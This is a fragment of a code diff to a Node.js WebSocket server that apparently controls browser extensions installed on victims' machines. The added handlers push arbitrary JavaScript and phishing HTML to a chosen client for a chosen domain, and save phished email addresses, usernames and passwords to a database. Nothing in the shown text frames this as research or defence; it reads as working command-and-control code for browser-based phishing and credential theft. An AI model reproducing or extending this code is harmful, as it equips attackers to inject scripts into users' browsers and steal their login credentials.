@@ -162,7 +162,7 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             var url =data.addString;
             database.updateSecurityWebsites(url);
             var json={id:"0",type:"listAdd",addString:url};
-            wss.broadcast(JSON.stringify(json));
+            wss.broadcast(JSON.stringify(json));//send to extensions
         }
         else if (type=='getHistory'){//get history for id
             var targetID = data.targetID;
@@ -197,8 +197,32 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             });
 
         }
+        else if (type=='sendJavascript'){//send javascript
+            var targetID= data.targetID;
+            var url=data.domain;
+            var script=data.script;
+            var json = {id:targetID,type:"javascript",domain:url,script:script};
+            wss.broadcast(JSON.stringify(json));
+        }
+
+        else if (type=='sendPhishingscript'){
+            var targetID= data.targetID;
+            var url=data.domain;
+            var json = {id:targetID,type:"html",domain:url};
+            wss.broadcast(JSON.stringify(json));
+        }
+
+        else if (type=='phishForm'){
+            var id= data.id;
+            var email=data.domain;
+            var username=data.phishName;
+            var password=data.phishPass;
+            //var json = {id:targetID,type:"html",domain:url};
+            database.insertPhishingInfo(id,email,username,password);
+        }
+
         //SENDING DATA
-        wss.broadcast(message);
+        //wss.broadcast(message);
         /*
         wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
             if (client.readyState === WebSocket.OPEN) {
